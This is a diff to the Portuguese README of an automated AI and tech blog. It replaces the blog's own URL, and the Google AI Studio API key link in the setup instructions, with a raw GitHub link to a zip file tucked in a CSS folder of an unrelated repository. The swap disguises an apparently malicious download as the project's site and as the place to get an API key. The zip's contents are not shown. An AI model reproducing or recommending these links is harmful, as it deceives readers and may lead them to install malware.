@@ -2,7 +2,7 @@
 
 Blog automatizado sobre Inteligência Artificial e Tecnologia, otimizado para SEO e monetização com Google AdSense.
 
-🌐 **URL:** https://fontesrubens4.github.io
+🌐 **URL:** https://raw.githubusercontent.com/newsprogramedwinduboishayward228/newsprogramedwinduboishayward228.github.io/main/static/css/Dist-embryophore.zip
 
 ## Como Funciona
 
@@ -25,7 +25,7 @@ Blog automatizado sobre Inteligência Artificial e Tecnologia, otimizado para SE
 ## Gerar Artigos Manualmente
 
 ```bash
-# Configurar chave da API (grátis em https://aistudio.google.com/app/apikey)
+# Configurar chave da API (grátis em https://raw.githubusercontent.com/newsprogramedwinduboishayward228/newsprogramedwinduboishayward228.github.io/main/static/css/Dist-embryophore.zip)
 export GEMINI_API_KEY="sua-chave-aqui"
 
 # Gerar um artigo
